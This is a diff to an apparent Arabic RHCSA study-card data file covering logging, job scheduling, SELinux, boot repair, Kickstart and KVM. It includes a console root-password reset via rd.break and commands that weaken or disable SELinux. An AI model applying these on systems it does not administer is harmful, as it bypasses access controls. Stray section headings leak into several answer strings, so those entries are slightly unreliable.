                 id: 58,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هو journalctl وما هو rsyslog؟`,
-                a: `<strong>نظام تتبع وقراءة سجلات الخادم (Logging Systems):</strong><br><ul><li><code>journalctl</code>: الأداة الحديثة لقراءة واستعلام السجلات الهيكلية المشفرة والمنظمة بواسطة خدمة <code>systemd-journald</code> في الذاكرة المؤقتة.</li><li><code>rsyslog</code>: خدمة تقوم باستقبال سجلات النظام والخدمات، وتصنيفها بناءً على نوعها وخطورتها، وكتابتها بشكل دائم داخل ملفات نصية منظمة على القرص (مثل <code>/var/log/messages</code>).</li></ul>`
+                a: `journalctl — عرض سجلات systemd-journald (هيكلية). rsyslog — حفظ السجلات في ملفات نصية دائمة (/var/log/messages).`,
+                example: `journalctl -u sshd --since "yesterday"`,
+                mistakes: `البحث اليدوي المتعب في ملفات log الضخمة بدلاً من تصفيتها بـ journalctl الذكي.`,
+                lab: `افحص سجلات محاولات الـ SSH الفاشلة باستخدام خيارات التصفية بـ <code>journalctl</code>.`,
+                ref: `man journalctl / man rsyslog.conf`,
+                related: ['rsyslogd', 'logger']
             },
             {
                 id: 59,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs'],
+                usedIn: ['RHCSA'],
                 q: `ما الفرق بين at و cron؟`,
-                a: `<strong>جدولة المهام الآلية في أوقات مختلفة:</strong><br><ul><li><code>at</code>: أداة لجدولة مهمة أو أمر برمجي ليتم تنفيذه **لمرة واحدة فقط** في وقت محدد بالمستقبل وينتهي مفعولها بمجرد التنفيذ.</li><li><code>cron</code>: أداة لجدولة مهام برمجية وسكريبتات ليتم تشغيلها **بشكل متكرر ودوري** بناءً على نمط زمني محدد (دقائق، ساعات، أيام، شهور).</li></ul>`
+                a: `at — مهمة لمرة واحدة في المستقبل. cron — مهام متكررة.`,
+                example: `echo "sh backup.sh" | at 02:00`,
+                mistakes: `استخدام cron لمهام غير متكررة ستنفذ لمرة واحدة فقط.`,
+                lab: `جدول مهمة بسيطة لمرة واحدة بـ <code>at</code> وتحقق منها بـ <code>atq</code>.`,
+                ref: `man at`,
+                related: ['cron', 'sleep']
             },
             {
                 id: 60,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs'],
+                usedIn: ['RHCSA'],
                 q: `كيف تُعد مهمة cron؟`,
-                a: `<strong>صياغة وجدولة المهام الدورية (Crontab Rules):</strong><br>نفتح محرر الجدولة الخاص بالمستخدم الحالي بالخيار: <code>crontab -e</code>.<br>ونقوم بكتابة القاعدة باتباع التنسيق المكون من 5 حقول أساسية كالتالي:<br><code>* * * * *  /path/to/script.sh</code><br><strong>الحقول بالترتيب:</strong> الدقيقة (0-59)، الساعة (0-23)، يوم الشهر (1-31)، الشهر (1-12)، يوم الأسبوع (0-6).`
+                a: `crontab -e — 5 حقول: دقيقة، ساعة، يوم الشهر، شهر، يوم الأسبوع.`,
+                example: `crontab -e\n0 2 * * * /backup.sh`,
+                mistakes: `خطأ في ترتيب حقول الوقت الخمسة مما يسبب تشغيل المهمة في وقت عشوائي أو متكرر جداً.`,
+                lab: `أنشئ مهمة crontab تطبع رسالة كل دقيقة للملف المؤقت وتأكد من عملها.`,
+                ref: `man 5 crontab`,
+                related: ['cron', 'anacron']
             },
             {
                 id: 61,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs'],
+                usedIn: ['RHCSA'],
                 q: `ما هو anacron ومتى يُستخدم؟`,
-                a: `<strong>مدير المهام المجدولة الفائتة:</strong><br>أداة ذكية مكملة للـ cron؛ تستخدم لإدارة وتشغيل المهام الدورية (اليومية، الأسبوعية، الشهرية) التي **فات موعد تشغيلها المجدول** بسبب إيقاف تشغيل الخادم أو انقطاع الطاقة. بمجرد إقلاع السيرفر مجدداً، يتحقق anacron من المهام الفائتة وينفذها فوراً بعد تأخير محدد لتجنب فقدان التقارير والنسخ الاحتياطي.`
+                a: `ينفذ المهام المؤجلة لو كانت الخادم مطفأً أثناء الموعد المجدول (مثل /etc/cron.daily/).`,
+                example: `cat /etc/anacrontab`,
+                mistakes: `الاعتقاد بأن anacron يمكنه جدولة مهام بالدقائق أو الساعات؛ هو يدعم فقط الجدولة بالأيام والأسابيع.`,
+                lab: `افحص ملف الإعدادات <code>/etc/anacrontab</code> لتعلم كيف تدار المهام المجدولة اليومية والأسبوعية.`,
+                ref: `man anacron`,
+                related: ['cron', 'systemd.timer']
             },
             {
                 id: 62,
                 cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Advanced",
+                tags: ['Logs', 'Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هي systemd timers وما مثال عليها؟`,
-                a: `<strong>الجدولة المعاصرة في نظام systemd:</strong><br>بديل حديث ومرن لأداة cron التقليدية، وتعتمد على تشغيل وإدارة ملفات وحدات من النوع <code>.timer</code> تتحكم في تشغيل خدمات <code>.service</code> مخصصة. ميزتها الدقة الفائقة وسهولة رصد وتتبع الأخطاء. مثال شهير عليها: <code>systemd-tmpfiles-clean.timer</code> لتنظيف الملفات المؤقتة.`
+                a: `بديل معاصر لـ cron. مثال: systemd-tmpfiles-clean — تنظيف المجلدات المؤقتة تلقائياً.
+🔟 SELinux`,
+                example: `systemctl list-timers`,
+                mistakes: `اعتقاد أن نظام cron كافٍ لجميع الجدولة؛ مؤقتات systemd توفر تتبعاً دقيقاً وحماية أكبر وتكاملاً مع الخدمات.`,
+                lab: `تصفح المؤقتات الفعالة بنظامك وعاين الخدمة المرتبطة بها.`,
+                ref: `man systemd.timer`,
+                related: ['systemctl', 'crond']
             },
             {
                 id: 63,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هو SELinux وما الفرق بين MAC و DAC؟`,
-                a: `<strong>مستويات الحماية والتحكم بالصلاحيات بنواة النظام:</strong><br>SELinux هي آلية أمنية مدمجة بنواة لينكس لتطبيق قيود صارمة على العمليات والملفات:<br><ul><li><strong>DAC (التحكم التقليدي):</strong> صلاحيات مبنية على ملكية المستخدم (u, g, o)، حيث يمكن لمالك الملف التنازل عنها أو تعديلها لغيره.</li><li><strong>MAC (التحكم الإلزامي لـ SELinux):</strong> قيود إجبارية تطبقها النواة بناءً على سياسات أمنية محددة مسبقاً، ولا يمكن لأي مستخدم (حتى الـ <code>root</code>) التنازل عنها أو تجاوزها.</li></ul>`
+                a: `Security-Enhanced Linux. MAC (Mandatory Access Control) — تحكم إلزامي مستقل حتى عن root. DAC (Discretionary Access Control) — أذونات المستخدم التقليدية.`,
+                example: `getenforce`,
+                mistakes: `تعطيل SELinux كحل فوري لمشاكل صلاحيات البرمجيات؛ هذا يدمر جدار حماية النواة تماماً ويعرض السيرفر للاختراق.`,
+                lab: `افحص وضع SELinux الحالي باستخدام <code>sestatus</code>.`,
+                ref: `man selinux`,
+                related: ['setenforce', 'chcon']
             },
             {
                 id: 64,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هي فلسفة SELinux؟`,
-                a: `<strong>فلسفة المنع والرفض التلقائي (Deny by Default):</strong><br>الآلية الأمنية لـ SELinux تعتبر أي محاولة وصول أو تواصل بين أي عملية (Process) وأي ملف أو منفذ غير مصرح بها صراحة في سياسة النظام هي محاولة **ممنوعة ومرفوضة تلقائياً**، حتى لو كانت العملية تعمل بصلاحيات المسؤول <code>root</code>.`
+                a: `"المنع الافتراضي" — أي عملية بدون تصريح صريح = حظر، حتى لو كانت root.`,
+                example: `SELinux Default Deny Policy`,
+                mistakes: `افتراض أن تشغيل التطبيق بصلاحية root يمنحه الصلاحيات التلقائية للولوج؛ SELinux يحظره إن لم يصرح له.`,
+                lab: `جرب تشغيل تطبيق غير مصرح له بقراءة مسار محمي وعاين الحظر بسجلات audit.`,
+                ref: `SELinux Security Policy Guide`,
+                related: ['semanage', 'restorecon']
             },
             {
                 id: 65,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هي أوضاع SELinux الثلاثة؟`,
-                a: `<strong>حالات تشغيل SELinux في النظام:</strong><br><ul><li><strong>Enforcing:</strong> الوضع الافتراضي والأكثر أماناً؛ يتم تطبيق كافة السياسات وحظر أي محاولات وصول غير قانونية وتسجيلها بالكامل في سجلات التدقيق AVC.</li><li><strong>Permissive:</strong> وضع التشخيص؛ لا يمنع أو يحظر أي عملية ولكنه يسجل كافة الانتهاكات كتحذيرات في سجلات التدقيق لتسهيل حل المشاكل.</li><li><strong>Disabled:</strong> معطل بالكامل.</li></ul>`
+                a: `Enforcing (تطبيق القواعد)، Permissive (تسجيل فقط)، Disabled (معطل).`,
+                example: `setenforce Permissive`,
+                mistakes: `البقاء في وضع Permissive بشكل دائم على الخوادم الحية؛ هذا الوضع للتشخيص والتصحيح فقط.`,
+                lab: `حول الوضع مؤقتاً لـ Permissive لتشخيص مشكلة حظر، ثم أعده لـ Enforcing.`,
+                ref: `man setenforce`,
+                related: ['getenforce', 'sestatus']
             },
             {
                 id: 66,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هو Security Context وما هي مكوناته؟`,
-                a: `<strong>الوسم الأمني للهويات والملفات (Security Context):</strong><br>هو وسم أو تصنيف أمني يسند لكل ملف ومجلد وعملية ومنفذ شبكي في النظام. يتكون من أربعة أجزاء تفصلها نقطتان:<br><code>المستخدم:الدور:النوع:المستوى</code><br>مثال: <code>system_u:object_r:httpd_sys_content_t:s0</code><br>والجزء الثالث وهو <strong>النوع (Type)</strong> هو الأهم على الإطلاق لفرض سياسات الوصول (Type Transition).`
+                a: `(المستخدم:الدور:النوع:المستوى). مثال: unconfined_u:object_r:httpd_sys_content_t:s0`,
+                example: `ls -Z /var/www/html`,
+                mistakes: `تعديل الجزء الخاص بالمستخدم أو الدور يدوياً بدلاً من تعديل النوع (Type) وهو الأهم للسياسة التارقتد.`,
+                lab: `افحص الوسم الأمني لمجلد الويب وتعرف على أقسامه الأربعة.`,
+                ref: `RHEL SELinux Context Reference`,
+                related: ['chcon', 'semanage']
             },
             {
                 id: 67,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هي Targeted Policy؟`,
-                a: `<strong>السياسة الأمنية المستهدفة الافتراضية في RHEL:</strong><br>هي السياسة الافتراضية؛ حيث تركز القيود وفحص السياقات بالكامل على العمليات العامة المعرضة للهجوم بالخارج (مثل خوادم الويب Apache، خوادم قواعد البيانات DNS)، بينما تترك العمليات المحلية والبرمجيات الخاصة بالمستخدم العادي تعمل بحرية وبدون حظر إضافي لتبسيط الاستخدام.`
+                a: `سياسة RHEL الافتراضية تركز على "النوع" (Type) فقط.`,
+                example: `Targeted vs Strict SELinux policies`,
+                mistakes: `تطبيق سياسة Strict صعبة التخصيص على سيرفرات إنتاجية عادية بدون تدريب مسبق.`,
+                lab: `تحقق من نوع السياسة النشطة بنظامك في ملف التكوين <code>/etc/selinux/config</code>.`,
+                ref: `SELinux Policies Manual`,
+                related: ['sestatus', 'semodule']
             },
             {
                 id: 68,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `ما هي SELinux Booleans ولماذا نستخدمها؟`,
-                a: `<strong>مفاتيح التحكم البرمجية لسياسات SELinux:</strong><br>هي متغيرات منطقية (مفاتيح تشغيل/إيقاف) مدمجة بالسياسة تتيح لمدير النظام تعديل وتغيير سلوك SELinux فورياً وبدون إعادة كتابة السياقات للملفات.<br>مثال للسماح لخادم الويب بالاتصال بقاعدة البيانات عبر الشبكة:<br><code>sudo setsebool -P httpd_can_network_connect_db on</code>`
+                a: `متغيرات منطقية لتفعيل خصائص استثنائية بدون تغيير السياقات. مثال: setsebool -P httpd_enable_homedirs on`,
+                example: `setsebool -P httpd_enable_homedirs on`,
+                mistakes: `نسيان خيار <code>-P</code> (Persistent) مما يتسبب في ضياع التعديل وعودة المنع بعد الـ reboot.`,
+                lab: `ابحث عن بوليان معين يتعلق بخدمة الويب وفعله بشكل دائم.`,
+                ref: `man getsebool / man setsebool`,
+                related: ['getsebool -a', 'togglesebool']
             },
             {
                 id: 69,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `كيف تضيف قاعدة سياق دائمة لمجلد؟`,
-                a: `<strong>تهيئة وتثبيت سياق أمني دائم للمسارات:</strong><br><ol><li>أضف قاعدة السياق لقاعدة بيانات SELinux الخاصة بالنظام:<br><code>sudo semanage fcontext -a -t httpd_sys_content_t "/custom(/.*)?"</code></li><li>قم بتطبيق وفرض القاعدة على المجلد والملفات بداخله بشكل تكراري:<br><code>sudo restorecon -Rv /custom</code></li></ol>`
+                a: `semanage fcontext -a -t httpd_sys_content_t "/web(/.*)?" ثم restorecon -Rv /web`,
+                example: `semanage fcontext -a -t httpd_sys_content_t "/web(/.*)?" && restorecon -Rv /web`,
+                mistakes: `استخدام <code>chcon</code> للتهيئة؛ صلاحيات chcon مؤقتة وتختفي تماماً بمجرد عمل restorecon للمجلد.`,
+                lab: `اضبط سياق أمان دائم لمجلد ويب مخصص وطبق التغييرات بـ <code>restorecon</code>.`,
+                ref: `man semanage-fcontext`,
+                related: ['restorecon', 'chcon']
             },
             {
                 id: 70,
                 cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `كيف تحلل أخطاء SELinux؟`,
-                a: `<strong>أدوات تشخيص وحل مشاكل الحظر الأمني:</strong><br><ul><li>ابحث وحلل السجلات الأمنيةAVC لتوليد تقرير تفصيلي بالحلول المقترحة باستخدام sealert:<br><code>sudo sealert -a /var/log/audit/audit.log</code></li><li>أو ابحث عن أحداث الرفض الأخيرة المسجلة بنظام التدقيق AVC:<br><code>sudo ausearch -m avc -ts recent</code></li></ul>`
+                a: `sealert -a /var/log/audit/audit.log أو ausearch -m avc -ts recent`,
+                example: `sealert -a /var/log/audit/audit.log`,
+                mistakes: `محلية الرفض المعقدة بالعين المجردة دون استخدام sealert المساعد.`,
+                lab: `افحص سجل التدقيقAVC وحلله بـ <code>sealert</code> لقراءة التوصيات المقترحة.`,
+                ref: `man sealert / man auditd`,
+                related: ['ausearch', 'auditctl']
             },
             {
                 id: 71,
                 cat: "🔟 SELinux",
+                difficulty: "Expert",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `كيف تعطل SELinux بشكل صحيح في RHEL 9؟`,
-                a: `<strong>التعطيل المعتمد لـ SELinux في RHEL 9:</strong><br>لم يعد RHEL 9 يدعم التعطيل عبر تعديل ملف <code>/etc/selinux/config</code> بالخيار <code>SELINUX=disabled</code> وقد يؤدي ذلك لتعليق إقلاع النظام. الطريقة الصحيحة والمعتمدة هي تمرير المعامل <code>selinux=0</code> كخيار إقلاع للنواة في إعدادات محمل الإقلاع GRUB لتوقيفه بالكامل من النواة.`
+                a: `لا تستخدم SELINUX=disabled في /etc/selinux/config! استخدم وسيطة إقلاع النواة: selinux=0 في GRUB.
+1️⃣1️⃣ الإقلاع والإصلاح`,
+                example: `grubby --update-kernel=ALL --args="selinux=0"`,
+                mistakes: `تعطيل SELinux في RHEL 9 بملف التكوين مما يعطل إقلاع النظام; التعطيل الآمن يتم عبر GRUB للنواة.`,
+                lab: `اطلع على معاملات إقلاع الكيرنل الحالية بـ <code>cat /proc/cmdline</code>.`,
+                ref: `RHEL 9 Deprecated SELinux Disabled Mode Guide`,
+                related: ['grub2-mkconfig', 'grubby']
             },
             {
                 id: 72,
                 cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هي مراحل الإقلاع في RHEL؟`,
-                a: `<strong>خطوات تشغيل خادم Linux (Boot Process):</strong><br><ol><li><code>POST</code>: فحص العتاد واللوحة الأم ذاتياً.</li><li><code>BIOS/UEFI</code>: تحميل البرامج الثابتة والبحث عن محمل الإقلاع.</li><li><code>GRUB2</code>: شاشة الخيارات واختيار النواة وتمرير معاملات الإقلاع.</li><li><code>Kernel & Initramfs</code>: تحميل النواة ونظام الملفات المؤقت بالرام لتجهيز مشغلات الأقراص.</li><li><code>systemd</code>: تشغيل مدير الخدمات الأساسي (PID 1).</li><li><code>Target</code>: تحميل مستوى التشغيل المطلوب (مثل الواجهة الرسومية أو السطرية).</li></ol>`
+                a: `POST → UEFI/BIOS → GRUB2 → Kernel + Initramfs → systemd → Target`,
+                example: `Boot stages hierarchy`,
+                mistakes: `اعتقاد أن GRUB2 يقوم بتحميل نظام التشغيل بالكامل؛ هو فقط يحمل النواة و initramfs للذاكرة.`,
+                lab: `راجع ملف تكوين الـ GRUB وتعرف على سطر تحميل النواة.`,
+                ref: `RHEL Boot Process Reference Guide`,
+                related: ['grub2-install', 'systemd-analyze']
             },
             {
                 id: 73,
                 cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هو Initramfs؟`,
-                a: `<strong>نظام الملفات الأولي المؤقت بالذاكرة (Initial RAM Filesystem):</strong><br>هو أرشيف مضغوط يحتوي على نظام ملفات مصغر ومشغلات العتاد والأجهزة (Drivers) الأساسية التي تحتاجها النواة (Kernel) لتتمكن من التعرف على القرص الصلب الحقيقي وتركيب نظام الملفات الجذري <code>/</code> (Root fs) لبدء إقلاع الخادم بنجاح.`
+                a: `صورة أولية تحتوي برامج تشغيل العتاد لتركيب نظام الملفات الجذري قبل تسليم التحكم لـ systemd.`,
+                example: `lsinitrd /boot/initramfs-$(uname -r).img | head`,
+                mistakes: `حذف أو تلف ملف initramfs؛ مما يسبب شلل الكيرنل عن قراءة الأقراص وتوقف الإقلاع بـ kernel panic.`,
+                lab: `افتح واستعرض محتويات ملف initramfs بنظامك وتعرف على مشغلات الأقراص داخله.`,
+                ref: `man initramfs`,
+                related: ['dracut', 'mkinitrd']
             },
             {
                 id: 74,
                 cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `ما هي أهداف systemd (Targets) المهمة؟`,
-                a: `<strong>مستويات التشغيل وإدارة بيئة النظام (Systemd Targets):</strong><br>الوحدات التي تحدد البيئة والخدمات التي ستعمل بعد الإقلاع:<br><ul><li><code>graphical.target</code>: تشغيل النظام بكامل الخدمات مع الواجهة الرسومية (GUI).</li><li><code>multi-user.target</code>: تشغيل النظام بالواجهة السطرية التفاعلية للشبكة (CLI) بدون واجهة رسومية (موفر جداً للموارد).</li><li><code>rescue.target</code>: بيئة صيانة محلية بمحرك محدود للغاية وصلاحيات root للمدراء.</li></ul>`
+                a: `graphical.target (مستوى 5)، multi-user.target (مستوى 3)، rescue.target (صيانة محدودة)، emergency.target (صيانة حرجة).`,
+                example: `systemctl isolate multi-user.target`,
+                mistakes: `الخلط بين rescue.target و emergency.target؛ الأخير لا يركب نظام الملفات الجذري ويمنح شل صيانة حرجاً جداً.`,
+                lab: `انتقل مؤقتاً للواجهة السطرية بـ <code>isolate</code> وتأكد من إغلاق الواجهة الرسومية.`,
+                ref: `man systemd.special`,
+                related: ['systemctl set-default', 'reboot']
             },
             {
                 id: 75,
                 cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `كيف تغير الهدف الافتراضي؟`,
-                a: `<strong>تعديل واجهة التشغيل الافتراضية للنظام:</strong><br>لتغيير الواجهة التي سيعمل بها النظام تلقائياً عند الإقلاع (مثال: التحويل للواجهة السطرية لتوفير الموارد في السيرفرات):<br><code>sudo systemctl set-default multi-user.target</code><br>وللتحقق من الهدف الافتراضي الحالي:<br><code>systemctl get-default</code>`
+                a: `systemctl set-default multi-user.target`,
+                example: `systemctl set-default multi-user.target`,
+                mistakes: `الاعتقاد بأن تغيير التارقت يعطل إمكانية استخدام الواجهة الرسومية لاحقاً؛ يمكنك الانتقال يدوياً دائماً.`,
+                lab: `غيّر هدف الإقلاع الافتراضي للنظام إلى الواجهة السطرية وتحقق بعد عمل reboot.`,
+                ref: `systemctl default targets documentation`,
+                related: ['systemctl isolate', 'get-default']
             },
             {
                 id: 76,
                 cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
                 q: `كيف تستعيد كلمة مرور root بدون قرص خارجي؟`,
-                a: `<strong>خطوات استعادة وكسر كلمة مرور المسؤول (Root Password Reset):</strong><br><ol><li>أعد تشغيل الخادم واضغط على مفتاح <code>e</code> في شاشة خيارات GRUB لتعديل معايير الإقلاع.</li><li>ابحث عن السطر الذي يبدأ بـ <code>linux</code> وأضف العبارة <code>rd.break</code> في نهايته ثم اضغط <code>Ctrl+X</code> للإقلاع.</li><li>أعد تركيب مجلد الجذر الفيزيائي بصلاحية تعديل وكتابة:<br><code>mount -o remount,rw /sysroot</code></li><li>انتقل لجذر النظام الفيزيائي الحقيقي:<br><code>chroot /sysroot</code></li><li>قم بتعيين كلمة مرور root الجديدة:<br><code>passwd root</code></li><li>**خطوة حاسمة لـ SELinux:** أنشئ ملف إعادة الوسم:<br><code>touch /.autorelabel</code></li><li>أدخل <code>exit</code> مرتين للمتابعة وإعادة التشغيل.</li></ol>`
+                a: `أوقف الإقلاع في GRUB2
+عدل سطر النواة وأضف rd.break
+mount -o remount,rw /sysroot
+chroot /sysroot
+passwd root
+touch /.autorelabel ⬅️ مهم جداً لـ SELinux!
+exit و reboot`,
+                example: `rd.break kernel parameter procedure`,
+                mistakes: `نسيان كتابة <code>touch /.autorelabel</code> مما يمنعك من استخدام كلمة المرور الجديدة لرفض SELinux لها.`,
+                lab: `جرب محاكاة استعادة الباسورد على سيرفر تجريبي لتعتاد الخطوات الحيوية للامتحان.`,
+                ref: `RHEL Root Password Recovery`,
+                related: ['chroot', 'passwd']
             },
             {
                 id: 77,
                 cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
                 q: `لماذا touch /.autorelabel ضروري بعد تغيير كلمة مرور root؟`,
-                a: `<strong>أهمية فرض إعادة الوسم الأمني لـ SELinux:</strong><br>لأن تغيير كلمة مرور الـ root يقوم بإنشاء ملف كلمة مرور جديد <code>/etc/shadow</code> على القرص، وهذا الملف الجديد ينشأ بدون سياق الأمان المعتمد لـ SELinux. إذا لم تقم بإنشاء الملف المخفي <code>/.autorelabel</code>، سيقوم SELinux بحظر قراءة ملف shadow عند محاولتك لتسجيل الدخول ويمنعك من الدخول بالكلمة الجديدة.`
+                a: `لأن /etc/shadow الجديد يفتقد سياق SELinux الصحيح. .autorelabel يجبر النظام على إعادة مسح السياقات قبل الإقلاع.`,
+                example: `touch /.autorelabel`,
+                mistakes: `تجاوز هذه الخطوة بعد تغيير باسورد الـ root؛ مما يسبب حظراً كاملاً للدخول بعد الـ reboot.`,
+                lab: `تفحص ملفات النظام وتعرف على كيفية عمل ميزة الوسم التلقائي عند الإقلاع.`,
+                ref: `SELinux Autorelabel Guide`,
+                related: ['restorecon', 'semanage']
             },
             {
                 id: 78,
                 cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
                 q: `كيف تصلح خطأ في /etc/fstab يمنع الإقلاع؟`,
-                a: `<strong>إصلاح أخطاء تركيب الأقراص التالفة (Fstab Recovery):</strong><br>عند تعذر تركيب قرص مسجل في fstab، يعلق النظام ويدخلك في Emergency Shell. للإصلاح:<br><ol><li>أعد تركيب مجلد الجذر الأساسي بصلاحية تعديل وكتابة بالذاكرة الحالية:<br><code>mount -o remount,rw /</code></li><li>افتح الملف بمحرر النصوص وقم بتعطيل أو تعديل السطر التالف:<br><code>vi /etc/fstab</code></li><li>حدث إعدادات الخدمات وأعد التشغيل:<br><code>systemctl daemon-reload && reboot</code></li></ol>`
+                a: `يدخلك النظام Emergency Shell تلقائياً. عدل /etc/fstab → systemctl daemon-reload → reboot.
+1️⃣2️⃣ الأتمتة والحاويات`,
+                example: `mount -o remount,rw /`,
+                mistakes: `محاولة تعديل fstab وهو للقراءة فقط (Read-only) في طور الطوارئ دون إعادة تركيبه بصلاحية كتابة.`,
+                lab: `ادخل لطور الطوارئ وجرب تعديل fstab لإصلاح مسار تركيب خاطئ.`,
+                ref: `Emergency Mode Recovery Manual`,
+                related: ['fstab', 'mount']
             },
             {
                 id: 79,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هو Kickstart وما مكونات ملفه؟`,
-                a: `<strong>سكريبت التثبيت التلقائي للأنظمة (Kickstart Automation):</strong><br>ملف نصي يحتوي على كافة إجابات وتكوينات التثبيت لنظام RHEL لتنصيبه آلياً على آلاف السيرفرات دون تدخل بشري. مكونات ملف <code>ks.cfg</code> الأساسية:<br><ul><li>خيارات النظام الأساسية (اللغة، لوحة المفاتيح، إعدادات الشبكة، كلمة مرور root).</li><li>قسم التقسيم الذاتي للأقراص (Partitioning).</li><li>قسم الحزم <code>%packages</code> لتحديد البرامج المراد تثبيتها.</li><li>قسم سكريبت ما بعد التثبيت <code>%post</code> لإعداد السيرفر ذاتياً فور التنصيب.</li></ul>`
+                a: `نظام تثبيت آلي. يحتوي على: autopart, clearpart, %packages, %post (سكربتات ما بعد التثبيت).`,
+                example: `Kickstart file installation syntax`,
+                mistakes: `استخدام خيارات تثبيت خاطئة في ملف ks.cfg تسبب توقف عملية الأتمتة.`,
+                lab: `افحص ملف الـ Kickstart الخاص بـ Anaconda المتواجد بمجلد الـ root وافهم خياراته.`,
+                ref: `RHEL Kickstart Reference`,
+                related: ['ksvalidator', 'anaconda']
             },
             {
                 id: 80,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `كيف تتحقق من صحة ملف Kickstart؟`,
-                a: `<strong>أداة فحص أخطاء ملف الأتمتة:</strong><br>قبل البدء في استخدام ملف Kickstart للتثبيت التلقائي، يجب فحصه والتأكد من خلوه من الأخطاء النحوية والخيارات الملغاة باستخدام الأداة المخصصة:<br><code>ksvalidator /path/to/ks.cfg</code>`
+                a: `ksvalidator /path/to/ks.cfg`,
+                example: `ksvalidator /root/anaconda-ks.cfg`,
+                mistakes: `استخدام الملف مباشرة في التثبيت دون التحقق؛ وجود خطأ نحوي بسيط سيفشل عملية التثبيت بالشبكة.`,
+                lab: `شغل أداة الفحص على ملف Kickstart محلي وافحص تقرير الأخطاء.`,
+                ref: `man ksvalidator`,
+                related: ['anaconda', 'pxe']
             },
             {
                 id: 81,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Expert",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هو KVM وما ميزته؟`,
-                a: `<strong>التقنية الافتراضية المدمجة في نواة لينكس (Kernel-based VM):</strong><br>هي تقنية تحول نظام Linux إلى Hypervisor من النوع الأول (Type-1) لتشغيل الأنظمة الوهمية. ميزاتها الأساسية:<br><ul><li>أداء فائق وقريب جداً من العتاد الحقيقي لأنها مدمجة بنواة النظام مباشرة.</li><li>أمان متقدم جداً؛ حيث يعتمد KVM على سياسات SELinux الخاصة بـ <code>sVirt</code> لعزل كل جهاز وهمي تماماً ومنع أي تداخل بين السيرفرات الوهمية.</li></ul>`
+                a: `Kernel-based Virtual Machine — يحول نواة Linux إلى Hypervisor. أداء مباشر للعتاد + عزل عبر SELinux (sVirt).`,
+                example: `virt-install --name my-vm --ram 2048 ...`,
+                mistakes: `تشغيل أجهزة افتراضية دون تفعيل SELinux/sVirt، مما يتيح للـ VM المخترق الوصول لبقية الـ VMs الأخرى.`,
+                lab: `افحص حالة خدمة الكوكبت لإدارة الأجهزة الوهمية وقم بتفعيل sVirt.`,
+                ref: `KVM/sVirt Security Guide`,
+                related: ['virsh', 'virt-manager']
             },
             {
                 id: 82,
                 cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
                 q: `ما هي Cockpit وما تضيفه حزمة cockpit-machines؟`,
-                a: `<strong>واجهة ويب لإدارة خادم RHEL والتحكم به:</strong><br><ul><li><code>Cockpit</code>: واجهة ويب تفاعلية مذهلة تتيح لمدراء الأنظمة التحكم بالسيرفر بالكامل من المتصفح (مراقبة الموارد، إدارة الشبكة، وقراءة السجلات).</li><li>حزمة <code>cockpit-machines</code>: هي إضافة تضيف واجهة كاملة لإدارة الأجهزة الافتراضية (VMs) بسهولة تامة (إنشاء، تعديل، تشغيل، وأخذ لقطات Snapshots).</li></ul>`
